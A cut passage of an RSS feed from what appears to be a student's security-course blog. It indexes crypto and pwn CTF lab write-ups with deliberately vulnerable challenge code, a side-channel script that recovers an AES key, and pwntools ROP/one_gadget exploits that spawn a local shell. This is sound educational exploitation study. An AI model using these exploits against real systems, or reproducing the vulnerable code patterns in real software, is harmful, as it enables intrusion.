35154524936059729204581782839781987236407179504895959653768093617367549802652967862418906182387861924584809825831862791349195432705129622783580000716829283234184762744224095175044663151370869751957952842383581513986293064879608592662677541628813345923397286253057417592725291925603753086190402107943880261658 ::: :::spoiler Alice.py</description></item><item><title>Simple Crypto - 0x08(2023 Lab - dlog)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/index.html</guid><description>Simple Crypto - 0x08(2023 Lab - dlog) Background [edu-ctf 2023] week03 - crypto2 Cryptography and Network Security – Homework 2 - Little Knowledge Proof
Source code :::spoiler Source Code
from Crypto.Util.number import isPrime, bytes_to_long import os from secret import FLAG p = int(input("give me a prime: ").strip()) if not isPrime(p): print("Do you know what is primes?") exit(0) if p.bit_length() != 1024: print("Bit length need to be 1024") exit(0) g = int(input("give me a number: ").strip()) flag = bytes_to_long(FLAG) print('The hint about my secret:', pow(g, flag, p)) :::</description></item><item><title>Simple Crypto - 0x09(2023 Lab - signature)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/index.html</guid><description>Simple Crypto - 0x09(2023 Lab - signature) Background [edu-ctf 2023] week03 - crypto2 - ECDSA
Source code :::spoiler Source Code
from random import randint from Crypto.Util.number import * from hashlib import sha256 from ecdsa import SECP256k1 from ecdsa.ecdsa import Public_key, Private_key, Signature from secret import FLAG E = SECP256k1 G, n = E.generator, E.order d = randint(1, n) k = randint(1, n) pubkey = Public_key(G, d*G) prikey = Private_key(pubkey, d) print(f'P = ({pubkey.point.x()}, {pubkey.point.y()})') for _ in range(3): print(''' 1) Request for Signature 2) Check the Permission 3) exit''') option = input() if option == '1': msg = input('What do you want? ') if msg == 'Give me the FLAG.': print('No way!') else: h = sha256(msg.encode()).digest() # k = k * 1337 % n sig = prikey.sign(bytes_to_long(h), k) print(f'sig = ({sig.r}, {sig.s})') elif option == '2': msg = 'Give me the FLAG.' r = input('r: ') s = input('s: ') h = bytes_to_long(sha256(msg.encode()).digest()) verified = pubkey.verifies(h, Signature(int(r), int(s))) if verified: print(FLAG) else: print('Bad signature') else: print("bye~") break :::</description></item><item><title>Simple Crypto - 0x10(2023 Lab - coppersmith)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/index.html</guid><description>Simple Crypto - 0x10(2023 Lab - coppersmith) Background coppersmith相關攻擊
Source code :::spoiler Source Code
from Crypto.Util.number import bytes_to_long, getPrime from secret import FLAG assert len(FLAG) &lt;= 30 p = getPrime(1024) q = getPrime(1024) n = p * q e = 3 padding = b"Padding in cryptography is a fundamental concept employed to ensure that data, typically in the form of plaintext, aligns properly with the encryption algorithm's block size. This process is crucial for symmetric block ciphers like AES and asymmetric encryption algorithms such as RSA. Padding involves adding extra bits to the input data before encryption, making it fit neatly into fixed-size blocks. The primary purpose of padding is to prevent information leakage by ensuring that the last block of plaintext is always complete, even when the original data's size isn't a perfect multiple of the block size. Common padding schemes include PKCS#7, PKCS#1 (for RSA), and ANSI X.923, each with its rules for padding and unpadding data. Proper padding ensures data integrity, security, and compatibility within cryptographic protocols." pt = padding + FLAG ct = pow(bytes_to_long(pt), e, n) print(f"{e = }") print(f"{n = }") print(f"{ct = }") # e = 3 # n = 11548249006448728920152703839381630946834097081458641312395741399152626808167055308830597218237419306363812953570976143239712039037941209800604194908083149885941768218371746741812573578768412807189143962911312361667909189521442378332430658999991458388376075547304981934158525694587528155624390264161508298680598416212224037418377397597560818727159266535257243347737195812548494888452510974912762585150695881388036715559552242157015756455473208463066542053661043988897316002396230791287157322382659981842882278113445574922266102197380093864871418103716702341116793118630092030597784102701252267617442078055768183287429 # ct = 10016669153906644953016660527326048255337800602435656916304698358749910229624738375584073093905785564737742726549033330343901680652357648652891913260149958947299067801907769873568759955053120633017158582128001396334187309835478967775943564724073809481988489791896725867047366927584419210464759674986336704398037888892734158765679221980466827060998749130113847401820986980535379266905587107992796676977541915779320084736207068268591500847603252838325486939367980604888710370629644796971859833251926677637185722683564847418746350226830775205063128441515048529918173084258483536354002888691012853231754416802134513394608 :::</description></item><item><title>Simple Crypto 0x11(2023 HW - invalid_curve_attack)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/index.html</guid><description>Simple Crypto 0x11(2023 HW - invalid_curve_attack) Background pekobot - maple
這邊我會嘗試用簡單的講法把這個攻擊簡述一遍，詳細還是建議 Crypton 或是其他地方的說明。
Invalid Curve Attack 大致上來說利用的是當一個不在原本曲線 $E$ 上的 $P$ 進行 scalar multiplication 的一些特性，使用類似 Pohlig–Hellman algorithm 的辦法在不同的 subgroup 解 DLP 然後用 CRT 解回原本的 private key。
一個 Short Weierstrass curve 長這樣:
$$ y^2 = x^3 + ax + b $$
而它的 point doubling formula ($R=2P$) 是:
$$ \begin{aligned} s &amp;= \frac{3x_P^2+a}{2y_P} \ x_R &amp;= s^2 - 2x_P \ y_R &amp;= y_P + s(x_R - x_P) \end{aligned} $$</description></item><item><title>Simple Crypto 0x12(2023 HW - signature_revenge)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/index.html</guid><description>Simple Crypto 0x12(2023 HW - signature_revenge) Background Source code :::spoiler Source Code
from Crypto.Util.number import * from hashlib import sha256, md5 from ecdsa import SECP256k1 from ecdsa.ecdsa import Public_key, Private_key from secret import FLAG import os E = SECP256k1 G, n = E.generator, E.order d = bytes_to_long( os.urandom(32 - len(FLAG)) + FLAG ) pubkey = Public_key(G, d*G) prikey = Private_key(pubkey, d) magic1 = md5(d.to_bytes(32, "big")).digest() magic2 = md5(d.to_bytes(32, "big")[::-1]).digest() h1 = sha256(b"https://www.youtube.com/watch?v=IBnrn2pnPG8").digest() h2 = sha256(b"https://www.youtube.com/watch?v=1H2cyhWYXrE").digest() k1 = bytes_to_long(magic1 + magic2) k2 = bytes_to_long(magic2 + magic1) sig1 = prikey.sign(bytes_to_long(h1), k1) sig2 = prikey.sign(bytes_to_long(h2), k2) print(f'P = ({pubkey.point.x()}, {pubkey.point.y()})') print(f'sig1 = ({sig1.r}, {sig1.s})') print(f'sig2 = ({sig2.r}, {sig2.s})') # P = (70427896289635684269185763735464004880272487387417064603929487585697794861713, 83106938517126976838986116917338443942453391221542116900720022828358221631968) # sig1 = (26150478759659181410183574739595997895638116875172347795980556499925372918857, 50639168022751577246163934860133616960953696675993100806612269138066992704236) # sig2 = (8256687378196792904669428303872036025324883507048772044875872623403155644190, 90323515158120328162524865800363952831516312527470472160064097576156608261906) :::</description></item><item><title>Simple Crypto 0x13(2023 HW - Power Analysis)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/index.html</guid><description>Simple Crypto 0x13(2023 HW - Power Analysis) Background [edu-ctf 2023] week04 - crypto3 [1:30:36]
Source code json file recorded by TA
Recon 這一題全部都是刻出來的，也包含算correlation coefficient，後面才知道numpy有這東西，但反正根據老師上課的作法一步一步跟著做是絕對沒有問題的，包含以下步驟:
Preprocessing 也就是把pt, ct, pm都按照簡報上的方式排列(各個trace的第一個byte都蒐集在一起，第二個byte都蒐集再一起…) 計算和sbox key XOR的結果 查表sbox 計算hamming weight model 計算和trace的correlation coefficient 看哪一個結果的數值最大，並把index結果記錄下來算它的ascii repeat以上操作後共可得16 bytes的flag 加速的方法: 可以把整個trace的圖片plot出來看看，會發現題目給的json file是把整段加密的過程記錄下來，所以我們可以只取前一兩百個point就可以完成key的還原 Exploit import json from tqdm import trange import numpy as np import copy from string import ascii_letters, digits from numpy import corrcoef jsonFile = open('./Crypto/HW3/traces.json', 'r') j = json.load(jsonFile) s_box = [ [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76], [0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0], [0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15], [0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75], [0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84], [0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF], [0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8], [0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2], [0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73], [0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB], [0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79], [0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08], [0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A], [0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E], [0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF], [0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16] ] def data_preprocess(json_data): pt_col = [] ct_col = [] trace_col = [] for bytes in range(16): tmp_pt_col = [] tmp_ct_col = [] for trace_idx in range(len(json_data)): tmp_pt_col.append(json_data[trace_idx]['pt'][bytes]) tmp_ct_col.append(json_data[trace_idx]['ct'][bytes]) pt_col.append(tmp_pt_col) ct_col.append(tmp_ct_col) for point in range(len(json_data[0]['pm'])): tmp_trace_col = [] for trace_idx in range(len(json_data)): tmp_trace_col.append(json_data[trace_idx]['pm'][point]) trace_col.append(tmp_trace_col) return pt_col, ct_col, trace_col def sbox_preprocess(pt_col): sbox_result_tmp = [] for sbox_key in range(256): # 總共有256個sbox key tmp = [] for trace in range(len(pt_col)): # 有50個trace tmp.append(pt_col[trace] ^ sbox_key) sbox_result_tmp.append(tmp) return sbox_result_tmp def choose_sbox(sbox_result_tmp): sbox_result = copy.deepcopy(sbox_result_tmp) for sbox_key in range(256): for trace in range(50): hex_value = '{0:0>2x}'.format(sbox_result_tmp[sbox_key][trace]) x, y = hex_value[0], hex_value[1] sbox_result[sbox_key][trace] = s_box[int(x, 16)][int(y, 16)] return sbox_result def cal_hamming_weight(sbox_result_col): hw_model = copy.deepcopy(sbox_result_col) for i in range(len(sbox_result_col)): # 256 for j in range(len(sbox_result_col[i])): # 50 hw_model[i][j] = bin(sbox_result_col[i][j]).count('1') return hw_model def cal_correlation(hw_model_col_result, trace_col): correlation_result = [] for i in (ascii_letters + digits).encode():#trange(len(hw_model_col_result)): &lt;- 加速的部分 for j in range(biggest_length): correlation_result.append(corrcoef(hw_model_col_result[i], trace_col[j])[0, -1]) return correlation_result def run_pearson_correlation(x, y): mean_x = np.mean(x) mean_y = np.mean(y) covariance = np.sum((x - mean_x) * (y - mean_y)) std_dev_x = np.sqrt(np.sum((x - mean_x)**2)) std_dev_y = np.sqrt(np.sum((y - mean_y)**2)) correlation = covariance / (std_dev_x * std_dev_y) return correlation def display_pt(offset:int, data_offset = (0, len(j[0]["pm"]))): plt.plot(range(data_offset[0], data_offset[1]), j[offset]["pm"][data_offset[0]:data_offset[1]]) plt.savefig(fname="pt_" + str(offset) + ".jpg") plt.clf() # display_pt(0, (0, 95)) # display_pt(0) pt_col, ct_col, trace_col = data_preprocess(j) flag = '' biggest_length = 95# len(trace_col) for idx in trange(16): sbox_preprocess_result = sbox_preprocess(pt_col[idx]) choose_sbox_result = choose_sbox(sbox_preprocess_result) hw_model_col_result = cal_hamming_weight(choose_sbox_result) correlation_result = cal_correlation(hw_model_col_result, trace_col) key_idx = correlation_result.index(max(correlation_result)) flag += (ascii_letters + digits)[key_idx // biggest_length] # from Crypto.Util.number import long_to_bytes # flag += long_to_bytes(key_idx // biggest_length).decode("cp437") print('The key of AES is: FLAG{' + flag + '}') 有嘗試過只選擇常見可使用的字元也就是abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789，以及trace只選擇前95個data，也可以正常解析出AES key並且算的更快(大約快77倍左右)</description></item><item><title>Simple PWN - 0x06(GOT hijacking/Lab - `got2win`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/index.html</guid><description>Simple PWN - 0x06(GOT hijacking/Lab - got2win) tags: CTF PWN eductf challenge: nc edu-ctf.zoolab.org 10004
GOT Background Lecture Vid. - Pwn week1 NTUSTISC - Pwn Basic 2 [2019.03.19]
Original Code :::spoiler Original Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;fcntl.h> char flag[0x30]; int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); int fd = open("/home/chal/flag", O_RDONLY); read(fd, flag, 0x30); close(fd); write(1, "Good luck !\n", 13); unsigned long addr = 0; printf("Overwrite addr: "); scanf("%lu", &amp;addr); printf("Overwrite 8 bytes value: "); read(0, (void *) addr, 0x8); printf("Give me fake flag: "); int nr = read(1, flag, 0x30); if (nr &lt;= 0) exit(1); flag[nr - 1] = '\0'; printf("This is your flag: ctf{%s}... Just kidding :)\n", flag); return 0; } :::</description></item><item><title>Simple PWN - 0x07(ROP)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x07rop/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x07rop/index.html</guid><description>Simple PWN - 0x07(ROP) tags: CTF PWN eductf Background This is very similar to normal BOF. If a sample code that doesn’t have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode. Therefore, the main idea is use some &lt;operation>;ret pattern segment to overlap stack. Original Code #include &lt;stdio.h> #include &lt;unistd.h> int main() { setvbuf(stdin, 0, _IONBF, 0) setvbuf(stdout, 0, _IONBF, 0); char s[0x10]; printf("Here is your \"/bin/sh\": %p\n", "/bin/sh"); printf("Give me your ROP: "); read(0, s, 0x400); return 0; } At line 11, %p means pointer of /bin/sh string. Note that, if you establish the code yourself, you must turn off the protection by the command below and use checksec to observe the protection. In addition, please use -static command to compile library at compile time, so that we can get ROP gadget more easily. gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static Exploit First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use ROP gadget to construct chain. Second, we use ROPgadget to find suitable gadget $ ROPgadget --multibr --binary rop > rop_gadget $ vim rop_gadget Note that, you may consider that pop rdx ; pop rbx ; ret is not what we want. We just want pop rdx ; ret. Therefore, we have to push one more value for pop rbx ; instruction. Then, we can construct our payload: from pwn import * context.arch = 'amd64' r = process('./rop') r.recvuntil('Here is your "/bin/sh": ') binsh = int(r.recvline()[:-1], 16) info(f"binsh: {hex(binsh)}") pop_rdi_ret = 0x401eaf pop_rsi_ret = 0x409ede pop_rdx_ret = 0x485aeb pop_rax_ret = 0x44fcc7 syscall = 0x401c64 Note that, r.recvline()[:-1] is b'0x498004' and we must pop to %rdi at line 17 below. Then we can combine them together using flat method. It’ll flat the address with length 8 bytes. ROP = flat( pop_rdi_ret, binsh, pop_rsi_ret, 0, pop_rdx_ret, 0, 0, pop_rax_ret, 0x3b, syscall, ) gdb.attach(r) r.sendafter("Give me your ROP: ", b'a' * 0x18 + ROP) r.interactive() Finally, we got shell!!! Analysis This is totally the same as our hypothesis. We can see that all parameters are ready Reference NTUSTISC - Pwn Basic 3 [2019.03.26] Pwn week1</description></item><item><title>Simple PWN - 0x08(one_gadget with ROP)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/index.html</guid><description>Simple PWN - 0x08(one_gadget with ROP) tags: CTF PWN eductf one_gadget background Day25: [Misc] 我從來沒想過我會害怕寫 code
原理是在 glibc 裡面有很多會透過 execve 執行 /bin/sh、再調用外部系統指令的 assembly，當 explolit 已經得知 libc 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數
Original Code #include &lt;stdio.h> #include &lt;unistd.h> int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IOBNF, 0); char s[0x10]; printf("Your libc: %p", printf); read(0, s, 0x100); return 0; } The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use ROP to get shell. Note that, it must be a dynamic library, so DO NOT use -static to compile it. gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack Exploit First, we use ldd command to find what library the program will use. In addition, we use one_gadget command to find execvs Note that, how to use it can refer to one_gadget用法 We use 0xebcf8 execve("/bin/sh", rsi, rdx) as our method Note: it has 3 constraint so that we can get the shell address rbp-0x78 is writable [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL Then, we use one_gadget command to get ROP chain ROPgadget --binary one_gadget_with_rop --only "pop|ret" > one_gadget vim one_gadget You can see that because we didn’t compile with library, the gadget that we may can use is very few. The solution is using the gadget that libc have: $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" > one_gadget $ vim one_gadget We must satisfied one_gadget constraint. 0x90529 and 0x2be51 are the offset of /lib/x86_64-linux-gnu/libc.so.6. Therefore, if we want to call these gadget, we must find out the real base address of /lib/x86_64-linux-gnu/libc.so.6. Because, ASLR is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the printf address in /lib/x86_64-linux-gnu/libc.so.6 → 0x7ffff7def770 Used gdb can find the current address of library → 0x7ffff7d8f000 Then we can know the offset and construct apart of payload as below $$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$ from pwn import * import sys context.arch = 'amd64' r = process('./one_gadget_with_rop') r.recvuntil("Your libc: ") libc = int(r.recv(14), 16) - 0x60770 info(f"libc: {hex(libc)}") And prepare our gadget: pop_rdx_rbx_ret = libc + 0x90529 pop_rsi_ret = libc + 0x2be51 Construct whole payload with considering the constraint: r.send(b'a'*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8)) r.interactivae() b'a'*0x10 is for $rsi p64(0x404000) is an arbitrary writable and readable address for $rbp-0x78 one of the constraint of one_gadget p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) is what we did in last lecture of ROP p64(libc+0xebcf8) is the one_gadget that we choose at the beginning. Finally, we got shell!!! Reference Linux ldd 查看執行檔執行時需要哪些 library Pwn week1</description></item><item><title>Simple PWN - 0x09(stack pivoting)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/index.html</guid><description>Simple PWN - 0x09(stack pivoting) tags: CTF PWN eductf Stack Pivoting background NTUSTISC - Pwn Basic 3 [2019.03.26] Pwn week1 It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed. More detailed info. can refer to Binary Exploitation (Pwn)
Original Code #include &lt;stdio.h> #include &lt;unistd.h> char name[0x80] int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); char s[0x10]; printf("Give me your name: "); read(0, name, 0x80); printf("Give me your ROP: "); read(0, s, 0x20); return 0; } You can observe that it has not much stack buffer overflow can use, but it has global variable name with space 0x80(can be another stack) gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static Note that: must use mprotect to change permission of global variable name just like lecture 0x04, add these line in original code #include &lt;sys/mman.h> mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC); Before mprotect - vmmap After mprotect - vmmap Exploit Construct ROP chain</description></item><item><title>Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/index.html</guid><description>Simple PWN - 0x10(seccomp/Lab - rop2win) tags: CTF PWN eductf challenge: nc edu-ctf.zoolab.org 10005
seccomp background Pwn week1
Original Code :::spoiler
#include &lt;stdio.h> #include &lt;unistd.h> #include &lt;seccomp.h> char fn[0x20]; char ROP[0x100]; // fd = open("flag", 0); // read(fd, buf, 0x30); // write(1, buf, 0x30); // 1 --> stdout int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_load(ctx); seccomp_release(ctx); printf("Give me filename: "); read(0, fn, 0x20); printf("Give me ROP: "); read(0, ROP, 0x100); char overflow[0x10]; printf("Give me overflow: "); read(0, overflow, 0x30); return 0; } :::</description></item><item><title>Simple PWN - 0x11(format string bug)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/index.html</guid><description>Simple PWN - 0x11(format string bug) tags: CTF PWN eductf format string bug background printf %n Original Code #include &lt;stdio.h> #include &lt;unistd.h> #include &lt;stdlib.h> int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); char fmt[0x20]; system("echo 'Give me fmt: '"); read(0, fmt, 0x20); printf(fmt); system("echo 'Give me string: '"); read(0, fmt, 0x20); puts(fmt); return 0; } $ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack In this problem, we can consider to use format string bug to achieve GOT hijacking without buffer overflow. The main idea is totally the same as GOT hijacking lecture Thus, we can observe which function can be overlapped by system plt → puts function Because… puts just needs one argument like system function, but how about printf? Unfortunately, it appeared before 2nd read function, because 2nd read needs to store the argument for system function such as sh\x00. Exploit - GOT hijacking + format string bug Our goal is hijack puts GOT to system plt</description></item><item><title>Simple PWN - 0x12(Lab - `rop++`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/index.html</guid><description>Simple PWN - 0x12(Lab - rop++) tags: CTF PWN eductf challenge: nc edu-ctf.zoolab.org 10004
Original Code #include &lt;stdio.h> #include &lt;unistd.h> #include &lt;string.h> int main() { char buf[0x10]; const char *msg = "show me rop\n> "; write(1, msg, strlen(msg)); read(0, buf, 0x200); return 0; } gcc -fno-stack-protector -static -o chal rop++.c Analyze Obviously buffer overflow!!!
Check protector
$ checksec chal [*] '/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Preliminary idea is using ROP chain and get shell, but the problem is where can I write /bin/sh\x00? We can use vmmap to observe where section is writable and readable → 0x4c5000~0x4c800</description></item><item><title>Simple PWN - 0x13(Lab - `how2know`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/index.html</guid><description>Simple PWN - 0x13(Lab - how2know) tags: CTF PWN eductf challenge: nc edu-ctf.zoolab.org 10002 Environment Version: 22.04
Original Code :::spoiler code
#include &lt;stdio.h> #include &lt;unistd.h> #include &lt;fcntl.h> #include &lt;seccomp.h> #include &lt;sys/mman.h> #include &lt;stdlib.h> static char flag[0x30]; int main() { void *addr; int fd; scmp_filter_ctx ctx; addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); if ((unsigned long)addr == -1) perror("mmap"), exit(1); fd = open("/home/chal/flag", O_RDONLY); if (fd == -1) perror("open"), exit(1); read(fd, flag, 0x30); close(fd); write(1, "talk is cheap, show me the code\n", 33); read(0, addr, 0x1000); ctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); seccomp_load(ctx); seccomp_release(ctx); ((void(*)())addr)(); return 0; } :::</description></item><item><title>Simple PWN - 0x14(Simple HEAP)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/index.html</guid><description>Simple PWN - 0x14(Simple HEAP) tags: CTF PWN eductf Version: Ubuntu 20.04
HEAP background Advanced Binary Exploitation (Pwn) - Heap Exploitation SS111-Pwn2
Allocate a memory Original Code #include &lt;stdio.h> #include &lt;stdlib.h> int main() { void *ptr; ptr = malloc(0x30); return 0; } $ sudo gcc -o simple_heap simple_heap.c -no-pie Analyze Before executing malloc, there is no heap space in memory layout</description></item><item><title>Simple PWN - 0x15(Lab - `heapmath`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/index.html</guid><description>Simple PWN - 0x15(Lab - heapmath) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code :::spoiler code
